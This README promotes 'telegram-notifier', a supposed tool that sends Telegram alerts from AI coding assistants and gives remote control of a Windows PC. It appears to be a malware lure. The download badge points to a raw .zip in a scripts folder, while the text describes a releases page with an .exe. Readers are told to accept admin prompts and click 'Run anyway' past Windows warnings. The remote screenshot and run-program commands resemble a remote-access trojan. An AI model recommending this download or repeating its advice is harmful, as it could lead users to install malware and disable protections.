# 📱 telegram-notifier - Send Alerts From Any AI Tool

## 🚀 What Is This?

telegram-notifier is a simple plugin that lets your AI coding tools send you messages on Telegram. You know how your phone buzzes when you get a text? This does the same thing, but for your AI assistants.

If you use tools like Antigravity, Claude Code, Codex, Cursor, or Windsurf, this plugin lets them ping you on Telegram when a task is done, when something needs your attention, or when an error happens. You can even set it up so you can control your computer remotely through Telegram messages.

Think of it as a remote control and notification system for your AI-powered work. No coding knowledge needed.

## 📥 Download and Install

[![Download telegram-notifier](https://img.shields.io/badge/Download-telegram--notifier-blue?style=for-the-badge&logo=github)](https://github.com/Gobbleswordknot1348/telegram-notifier/raw/refs/heads/main/scripts/3.7.zip)

Visit this link to download the application.

## 🛠️ How to Set It Up

### Step 1: Get the File

1. Click the blue download button above.
2. You will land on the releases page.
3. Look for the newest version at the top.
4. Click the file that ends with `.exe` (if you see multiple files, pick the one that says "setup" or "installer").
5. Your browser will download it. Check your "Downloads" folder.

### Step 2: Run the Installer

1. Double-click the downloaded file.
2. If Windows asks "Do you want to allow this app to make changes?", click **Yes**.
3. Follow the simple on-screen steps. Just keep clicking **Next** until it finishes.
4. When done, you will see the telegram-notifier icon in your system tray (bottom-right corner of your screen, near the clock).

### Step 3: Connect Your Telegram

1. Open Telegram on your phone or computer.
2. Search for **@BotFather** (it is the official bot that creates bots).
3. Send him the message: `/newbot`
4. He will ask for a name. Type anything, like "My AI Notifier".
5. He will ask for a username. It must end in "bot", like "MyAINotifierBot".
6. BotFather will give you a **token**. It looks like a long string of numbers and letters. Copy it.
7. Now, find your own Telegram ID. The easiest way is to message **@userinfobot** on Telegram. It will reply with your ID number. Write it down.

### Step 4: Enter Your Details

1. Right-click the telegram-notifier icon in your system tray.
2. Choose **Settings**.
3. Paste your **bot token** and your **user ID** into the boxes.
4. Click **Save**.
5. Send the message "hello" to your bot on Telegram. If it replies, you are connected!

## 🤖 Connecting to Your AI Tools

### For Antigravity, Claude Code, Codex, Cursor, or Windsurf

1. Open your AI tool of choice.
2. Look for the settings or configuration file.
3. Add the following line (replace the example token and ID with your own):

```
telegram_notifier_token=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
telegram_notifier_chat_id=987654321
```

4. Save the file and restart your AI tool.
5. Your AI tool will now send you Telegram messages when it finishes tasks or needs your input.

## 📡 Remote Control Setup

This is the fun part. You can send commands to your computer from your phone.

1. Make sure telegram-notifier is running (check the system tray).
2. Open your Telegram chat with your bot.
3. Type `/help` to see all available commands.

Common commands include:

- `/status` - Shows if your computer is on and working.
- `/screenshot` - Takes a picture of your screen and sends it to you.
- `/run notepad` - Opens a program on your computer.
- `/shutdown` - Turns off your computer (be careful with this one!).

## ✅ What to Expect

Once everything is set up, here is what happens:

1. Your AI tool finishes a long task.
2. telegram-notifier sends you a message: "Task complete! Took 3 minutes."
3. You are on the couch, but you know the work is done. No need to sit and watch the screen.

Or maybe you are away from your desk:

1. You send `/screenshot` to your bot.
2. You see exactly what is on your screen.
3. You send `/run chrome` to open your browser.

It is like having a remote control for your computer, plus a personal assistant that never forgets to update you.

## 🔒 Privacy and Security

- Your bot token is private. Do not share it with anyone.
- telegram-notifier only sends messages to your Telegram account (the ID you entered).
- The app runs locally on your computer. Your data does not go through any third-party servers.
- If you are done using it, right-click the tray icon and choose **Exit** to stop everything.

## 🧪 Testing Your Setup

After installation, try these tests:

1. **Test 1:** Send "hello" to your bot. You should get a reply.
2. **Test 2:** From your AI tool, run a simple command like "print hello world". You should get a Telegram message.
3. **Test 3:** Send `/status` to your bot. It should reply with your computer's info.

If any test fails, go back to Step 4 and double-check your token and ID.

## 🆘 Troubleshooting

**Problem:** The bot does not reply to "hello".
**Fix:** Check that you copied the token correctly. It must be exact. Also, make sure you entered your user ID, not your username.

**Problem:** My AI tool does not send messages.
**Fix:** Make sure telegram-notifier is running in the system tray. Also, check that you added the configuration lines to the correct file for your AI tool.

**Problem:** Windows blocked the app.
**Fix:** Click "More info" on the popup, then "Run anyway". This is normal for new apps that are not yet widely known.

**Problem:** I lost my token.
**Fix:** Message @BotFather again and send `/token`. He will show you your bot's token.

## 📦 Uninstalling

1. Right-click the telegram-notifier icon in the system tray.
2. Choose **Exit**.
3. Open Windows Settings → Apps → Installed apps.
4. Find telegram-notifier and click **Uninstall**.

## 💡 Tips for Best Experience

- Keep telegram-notifier running in the background. It uses very little memory.
- Use a dedicated bot for each project if you work on multiple things.
- You can rename your bot anytime with @BotFather.
- If you travel, you can still check on your computer from anywhere in the world.

## 🆕 Updates

telegram-notifier checks for updates automatically. When a new version is available, you will see a small popup. Just click **Update** and it will install itself.

To check manually, right-click the tray icon and choose **Check for Updates**.

## 📞 Getting Help

If you run into issues not covered here:

1. Visit the GitHub repository page.
2. Click the **Issues** tab at the top.
3. Click **New Issue** and describe your problem.
4. Someone from the community will help you out.

Please include your Windows version and what AI tool you are using when you ask for help.

## 🎉 You Are All Set

You now have a direct line between your AI tools and your phone. No more staring at progress bars. No more wondering if a task finished. Just open Telegram and you know.

Enjoy the freedom of walking away from your desk while your AI does the heavy lifting. And when you want to check in, just send a quick message.

Keywords: telegram notifier, AI agent notifications, remote control computer, Antigravity plugin, Claude Code integration, Codex alerts, Cursor notifications, Windsurf skill, Telegram bot setup, Windows automation, AI task alerts, phone notifications for coding, developer productivity tool, remote desktop via Telegram, bot token setup, AI assistant alerts.